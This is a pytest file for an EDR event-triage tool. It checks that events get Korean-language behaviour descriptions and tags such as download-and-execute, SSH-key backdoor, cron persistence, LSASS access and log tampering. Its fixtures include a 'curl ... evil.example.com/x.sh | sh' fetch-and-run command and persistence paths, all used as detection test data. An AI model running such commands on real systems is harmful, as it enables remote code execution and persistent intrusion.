from s1triage.analyzer import analyze_events
from s1triage.behavior import analyze_behavior, describe_event


def names(behavior):
    return {t.name for t in behavior.tags}


def test_process_creation_sentence_and_tags():
    b = describe_event({
        "eventType": "Process Creation", "srcProcName": "bash",
        "tgtProcName": "/usr/bin/curl", "tgtProcCmdLine": "curl -s http://evil.example.com/x.sh | sh",
    })
    assert b.sentence.startswith("[bash] curl 실행")
    assert {"외부 파일 다운로드", "다운로드 즉시 실행"} <= names(b)


def test_file_persistence_paths():
    assert "SSH 키 등록(백도어)" in names(describe_event(
        {"eventType": "File Modification", "srcProcName": "bash", "tgtFilePath": "/root/.ssh/authorized_keys"}))
    assert "예약 작업(cron) 등록" in names(describe_event(
        {"eventType": "File Creation", "srcProcName": "bash", "fileFullName": "/etc/cron.d/update"}))
    assert "계정/권한 파일 변경" in names(describe_event(
        {"eventType": "File Modification", "srcProcName": "vi", "tgtFilePath": "/etc/sudoers"}))


def test_log_write_by_daemon_is_not_tampering():
    daemon = describe_event({"eventType": "File Modification", "srcProcName": "sshd", "tgtFilePath": "/var/log/btmp"})
    assert daemon.tags == []
    wiped = describe_event({"eventType": "File Deletion", "srcProcName": "sshd", "tgtFilePath": "/var/log/auth.log"})
    assert "로그/흔적 변경" in names(wiped)
    shell = describe_event({"eventType": "File Modification", "srcProcName": "bash", "tgtFilePath": "/root/.bash_history"})
    assert "로그/흔적 변경" in names(shell)


def test_registry_network_handle_login():
    assert "자동 실행 레지스트리 등록" in names(describe_event({
        "eventType": "Registry Value Modified", "srcProcName": "x.exe",
        "registryPath": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\updater"}))
    net = describe_event({"eventType": "IP Connect", "srcProcName": "python3", "dstIp": "203.0.113.9", "dstPort": 4444})
    assert "203.0.113.9:4444" in net.sentence and "의심 포트로 외부 통신" in names(net)
    assert "LSASS 접근(인증정보 탈취 시도)" in names(describe_event(
        {"eventType": "Open Remote Process Handle", "srcProcName": "rundll32.exe", "tgtProcName": "lsass.exe"}))
    login = describe_event({"eventType": "Login", "loginsUserName": "root", "loginIsSuccessful": "false", "srcIp": "45.1.2.3"})
    assert "로그인 실패" in login.sentence and "45.1.2.3" in login.sentence


def test_unknown_event_type_still_described():
    b = describe_event({"eventType": "Something New", "srcProcName": "foo"})
    assert b.sentence == "[foo] Something New 이벤트" and b.tags == []


def test_timeline_sorted_and_collapsed_with_summary():
    events = [
        {"eventType": "Login", "loginsUserName": "root", "loginIsSuccessful": "false", "srcIp": "45.1.2.3", "createdAt": "2026-11-03T01:00:02Z"},
        {"eventType": "Login", "loginsUserName": "root", "loginIsSuccessful": "false", "srcIp": "45.1.2.3", "createdAt": "2026-11-03T01:00:01Z"},
        {"eventType": "File Modification", "srcProcName": "bash", "srcProcParentName": "sshd",
         "tgtFilePath": "/root/.ssh/authorized_keys", "createdAt": "2026-11-03T01:00:05Z"},
    ]
    r = analyze_behavior(events)
    assert r.timeline[0].count == 2 and "로그인 실패" in r.timeline[0].sentence
    assert r.timeline[1].sentence.endswith("/root/.ssh/authorized_keys")
    assert r.summary[0].startswith("주요 행위 주체는 bash(부모: sshd)")
    assert "SSH 키 등록(백도어)" in r.summary[2]
    assert r.highlights[0][0].name == "SSH 키 등록(백도어)"  # 가중치 높은 순


def test_benign_daemon_summary_and_no_sshd_finding():
    events = [{"eventType": "File Modification", "srcProcName": "sshd", "srcProcParentName": "systemd",
               "srcProcCmdLine": "/usr/sbin/sshd -D", "tgtFilePath": "/var/log/btmp"}]
    r = analyze_events(events)
    assert r.findings == []
    assert "해당하는 행위는 보이지 않습니다" in r.behavior.summary[-1]


def test_empty_events():
    assert analyze_behavior([]).summary == ["이 Storyline 에서 수집된 행위가 없습니다."]
